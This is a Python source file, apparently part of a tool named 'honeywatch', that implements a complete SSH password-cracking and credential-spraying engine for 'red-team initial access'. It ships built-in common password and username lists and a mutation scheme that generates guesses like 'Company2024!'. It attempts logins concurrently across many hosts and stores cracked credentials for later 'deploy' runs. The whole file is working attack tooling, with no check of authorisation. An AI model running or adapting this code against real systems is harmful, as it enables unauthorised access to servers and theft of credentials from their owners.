"""SSH password cracking engine for honeywatch.

A focused online credential-guessing module for the red-team initial-access
phase. It reuses the same optional ``paramiko`` transport that the full
fingerprint probe already depends on, so there are no new hard dependencies:
without paramiko installed the engine reports ``paramiko unavailable`` for
every attempt and never raises.

Design notes:

- **One fresh transport per attempt.** Reusing a transport across many
  ``auth_password`` calls is fragile (a single bad key-exchange or an auth
  lockout poisons the socket) and most sshd rate-limit per-connection, so a
  new TCP+KEX per guess is both simpler and closer to how a real attacker
  behaves. Concurrency is bounded by an :class:`asyncio.Semaphore`, mirroring
  ``fingerprint.probe.probe_many``.
- **Never raises.** Every attempt outcome is encoded in the returned
  :class:`CrackResult` (``success``, ``error``), so the CLI / agent layer can
  render results without try/except ladders.
- **Passwords are generators, not lists.** :func:`candidate_passwords` yields
  lazily so a huge wordlist never sits fully in memory; the concurrency fan-out
  drains it through a bounded queue.
- **Mutations.** A small built-in dialect turns a seed word ("company",
  "summer") into a population of guesses (``Company2024!``, ``company123``,
  ``SUMMER``, ...) the way a human would actually spray.

The cracked credentials are meant to be persisted via :class:`honeywatch.store.Store`
(``upsert_credential``) so later ``deploy`` runs can pick them up, and fed onto
:class:`honeywatch.models.Target.ssh_pass` for the worker's password exec mode.
"""

from __future__ import annotations

import asyncio
import itertools
import socket
from dataclasses import dataclass, field
from typing import Iterable, Iterator

__all__ = [
    "CrackAttempt",
    "CrackResult",
    "CrackTarget",
    "candidate_passwords",
    "crack_host",
    "crack_targets",
    "default_users",
    "load_wordlist",
]

# A deliberately small, boring starter list. The point is that *with* a
# wordlist + mutations this becomes a real spray; without one it still does
# something useful against the most over-deployed defaults on the internet.
_BUILTIN_PASSWORDS = (
    "password", "123456", "12345678", "qwerty", "admin", "root",
    "welcome", "letmein", "changeme", "passw0rd", "P@ssw0rd",
    "123456789", "1234567890", "abc123", "iloveyou", "monkey",
    "dragon", "master", "shadow", "superman", "minecraft",
)

# Common per-connection username population when the operator did not pin one.
_DEFAULT_USERS = (
    "root", "admin", "user", "ubuntu", "debian", "centos", "fedora",
    "oracle", "pi", "ec2-user", "ansible", "git", "postgres",
    "mysql", "support", "test", "guest", "operator", "sysadmin",
)

# Year/symbol suffixes appended to mutated base words. Ordered roughly by how
# often they show up in leaked credential dumps so the most likely guesses fire
# first and a ``--max-attempts`` cap is less likely to stop just short.
_SUFFIXES = (
    "", "1", "12", "123", "1234", "12345", "123456",
    "!", "@", "#", "$", "1!", "12!", "123!",
    "2020", "2021", "2022", "2023", "2024", "2025",
    "2023!", "2024!", "2025!", "@123", "@1234",
)


# --------------------------------------------------------------------------- #
# Data models
# --------------------------------------------------------------------------- #


@dataclass
class CrackTarget:
    """A host to crack, plus the credential population to throw at it.

    ``users`` and ``passwords`` are explicit override lists. When either is
    empty the engine expands it from :func:`default_users` /
    :func:`candidate_passwords` (seeded by ``wordlist`` and ``mutations``).
    """

    ip: str
    port: int = 22
    users: list[str] = field(default_factory=list)
    passwords: list[str] = field(default_factory=list)
    wordlist: list[str] | None = None
    mutations: bool = True
    # Cap guesses per (host) before giving up. None = unbounded (drain the
    # whole candidate stream).
    max_attempts: int | None = None
    # Seconds allowed for a single TCP+KEX+auth attempt.
    timeout_s: float = 6.0
    # Stop the host as soon as one (user, password) succeeds. Almost always
    # desired; set False only for auditing/coverage runs.
    stop_on_success: bool = True
    banner: str | None = None


@dataclass
class CrackAttempt:
    """One tried (user, password) pair against one host."""

    user: str
    password: str
    success: bool = False
    error: str | None = None


@dataclass
class CrackResult:
    """Outcome of cracking a single host."""

    ip: str
    port: int
    banner: str | None = None
    success: bool = False
    user: str | None = None
    password: str | None = None
    attempts: int = 0
    errors: list[str] = field(default_factory=list)
    # The full transcript of attempts is retained so reports/audits can show
    # what was tried even on failure. Trimmed to ``max_logged_attempts`` by the
    # caller if memory matters.
    transcript: list[CrackAttempt] = field(default_factory=list)
    error: str | None = None

    def credential(self) -> dict[str, str | None]:
        """A flat dict suitable for the store / JSON output."""
        return {
            "ip": self.ip,
            "port": self.port,
            "user": self.user,
            "password": self.password,
            "banner": self.banner,
            "success": self.success,
            "attempts": self.attempts,
        }


# --------------------------------------------------------------------------- #
# Wordlist + mutation plumbing
# --------------------------------------------------------------------------- #


def load_wordlist(path: str) -> list[str]:
    """Read a newline-separated wordlist, skipping blanks and comments.

    Never raises on a missing/unreadable file; returns ``[]`` so a bad
    ``--wordlist`` path degrades to the built-in population instead of
    killing a long scan.
    """
    words: list[str] = []
    try:
        with open(path, "r", encoding="utf-8", errors="replace") as fh:
            for line in fh:
                line = line.strip("\r\n")
                if not line or line.startswith("#"):
                    continue
                words.append(line)
    except OSError:
        return []
    return words


def default_users() -> list[str]:
    """The built-in username population (defensive copy)."""
    return list(_DEFAULT_USERS)


def _mutate(base: str) -> Iterator[str]:
    """Yield the dialect of a single seed word: case + numeric/symbol tails.

    Order is intentional: the seed itself, then capitalized (most common human
    habit), then the popular suffix families. Duplicates are skipped by the
    downstream :func:`candidate_passwords` dedupe pass.
    """
    yield base
    if base:
        yield base.capitalize()
        yield base.upper()
        yield base.lower()
    for suffix in _SUFFIXES:
        if not suffix:
            continue
        yield base + suffix
        yield base.capitalize() + suffix


def candidate_passwords(
    wordlist: Iterable[str] | None = None,
    mutations: bool = True,
    builtins: bool = True,
) -> Iterator[str]:
    """Yield unique password candidates in priority order.

    A small generator pipeline: built-in defaults first (cheap, high hit-rate
    on abandoned boxes), then the operator wordlist, optionally expanded by
    :func:`_mutate`. Uniqueness is preserved without buffering the whole set —
    a ``seen`` set grows, but the candidate stream itself stays lazy.
    """
    seen: set[str] = set()

    def emit(value: str) -> Iterator[str]:
        if value not in seen:
            seen.add(value)
            yield value

    sources: list[Iterable[str]] = []
    if builtins:
        sources.append(_BUILTIN_PASSWORDS)
    if wordlist:
        sources.append(wordlist)

    for source in sources:
        for base in source:
            base = base.strip()
            if not base:
                continue
            if mutations:
                for cand in _mutate(base):
                    yield from emit(cand)
            else:
                yield from emit(base)


# --------------------------------------------------------------------------- #
# Single-attempt login
# --------------------------------------------------------------------------- #


def _attempt_login(
    ip: str,
    port: int,
    user: str,
    password: str,
    timeout_s: float,
) -> CrackAttempt:
    """Synchronous one-shot SSH password auth. Never raises.

    Opens a socket with an explicit timeout, hands it to a fresh
    ``paramiko.Transport``, completes the key exchange, and calls
    ``auth_password``. The result is normalized into a :class:`CrackAttempt`
    so callers never need to introspect paramiko exception types.
    """
    attempt = CrackAttempt(user=user, password=password)
    try:
        import paramiko  # type: ignore[import-not-found]
    except Exception as exc:  # pragma: no cover - optional dependency
        attempt.error = f"paramiko unavailable: {exc!r}"
        return attempt

    transport = None
    try:
        sock = socket.create_connection((ip, port), timeout=timeout_s)
        sock.settimeout(timeout_s)
        transport = paramiko.Transport(sock)
        transport.start_client(timeout=timeout_s)
        transport.auth_password(user, password)
        # auth_password returns None on success and raises on failure.
        attempt.success = True
    except paramiko.AuthenticationException:
        attempt.success = False
    except (paramiko.SSHException, OSError, EOFError) as exc:
        # Connection refused, KEX failure, banner parse error, timeout, etc.
        # All of these are "this guess did not work", not engine faults.
        attempt.error = f"{type(exc).__name__}: {exc}"
    except Exception as exc:  # anything else: record and move on
        attempt.error = f"{type(exc).__name__}: {exc}"
    finally:
        if transport is not None:
            try:
                transport.close()
            except Exception:
                pass
    return attempt


async def _attempt_async(
    ip: str,
    port: int,
    user: str,
    password: str,
    timeout_s: float,
) -> CrackAttempt:
    """Run one blocking login attempt off the event loop."""
    return await asyncio.to_thread(
        _attempt_login, ip, port, user, password, timeout_s
    )


def _banner_grab(ip: str, port: int, timeout_s: float) -> str | None:
    """Grab the SSH identification banner for a result record.

    Reuses the raw-socket approach from the fingerprint probe so we don't pull
    a second SSH library in just to read one line.
    """
    try:
        with socket.create_connection((ip, port), timeout=timeout_s) as sock:
            sock.settimeout(timeout_s)
            data = sock.recv(256)
            line = data.split(b"\n", 1)[0]
            return line.decode("utf-8", "replace").strip("\r\n") or None
    except OSError:
        return None


# --------------------------------------------------------------------------- #
# Host + multi-host orchestration
# --------------------------------------------------------------------------- #


async def crack_host(
    target: CrackTarget,
    concurrency: int = 8,
    on_attempt=None,
) -> CrackResult:
    """Crack one host. Returns a :class:`CrackResult` (never raises).

    ``concurrency`` bounds simultaneous in-flight login attempts against the
    same host. Many sshd builds throttle or temporarily ban a source that fires
    too many parallel auth failures, so the default is deliberately modest
    (8). ``on_attempt`` is an optional callback invoked after each attempt with
    the :class:`CrackAttempt`, for live progress reporting.
    """
    users = target.users or default_users()
    if target.passwords:
        password_iter: Iterable[str] = iter(target.passwords)
    else:
        password_iter = candidate_passwords(
            wordlist=target.wordlist, mutations=target.mutations
        )

    result = CrackResult(ip=target.ip, port=target.port, banner=target.banner)
    if result.banner is None:
        result.banner = await asyncio.to_thread(
            _banner_grab, target.ip, target.port, target.timeout_s
        )

    sem = asyncio.Semaphore(max(1, concurrency))

    async def try_one(user: str, password: str) -> CrackAttempt:
        async with sem:
            return await _attempt_async(
                target.ip, target.port, user, password, target.timeout_s
            )

    # Fan out (user x password) combos. We materialize the user list (small)
    # but stream passwords through the generator so a giant wordlist never
    # fully lands in memory. The semaphore is what actually bounds in-flight
    # work; the itertools.product is lazy on the password side.
    pairs = itertools.product(users, password_iter)

    async def runner() -> None:
        # Cap via max_attempts by simply stopping after N completions.
        count = 0
        # We schedule in small batches so the semaphore + max_attempts cap
        # stay responsive rather than pre-creating a million tasks.
        batch: list[asyncio.Task] = []
        for user, password in pairs:
            if target.max_attempts is not None and count >= target.max_attempts:
                break
            batch.append(asyncio.create_task(try_one(user, password)))
            count += 1
            # Keep the in-flight window at ~2x concurrency so the semaphore is
            # the real gate and we don't eagerly exhaust the generator.
            if len(batch) >= max(concurrency * 2, 16):
                await _drain(batch, result, target, on_attempt)
                batch = []
        if batch:
            await _drain(batch, result, target, on_attempt)

    await runner()
    return result


async def _drain(
    tasks: list[asyncio.Task],
    result: CrackResult,
    target: CrackTarget,
    on_attempt=None,
) -> None:
    """Collect a batch of attempts, short-circuiting on first success."""
    for coro in asyncio.as_completed(tasks):
        attempt = await coro
        result.attempts += 1
        if attempt.error:
            result.errors.append(attempt.error)
        result.transcript.append(attempt)
        if on_attempt is not None:
            try:
                on_attempt(attempt, result)
            except Exception:
                pass
        if attempt.success:
            result.success = True
            result.user = attempt.user
            result.password = attempt.password
            if target.stop_on_success:
                for t in tasks:
                    t.cancel()
                break


async def crack_targets(
    targets: list[CrackTarget],
    concurrency: int = 8,
    host_concurrency: int = 32,
    on_result=None,
) -> list[CrackResult]:
    """Crack many hosts concurrently, bounded by ``host_concurrency``.

    ``concurrency`` is per-host (login attempts), ``host_concurrency`` caps how
    many hosts are being attacked at once. Results are returned in input order;
    ``on_result`` (if given) is called per finished host.
    """
    sem = asyncio.Semaphore(max(1, host_concurrency))

    async def one(target: CrackTarget) -> CrackResult:
        async with sem:
            res = await crack_host(target, concurrency=concurrency)
        if on_result is not None:
            try:
                on_result(res)
            except Exception:
                pass
        return res

    return list(await asyncio.gather(*(one(t) for t in targets)))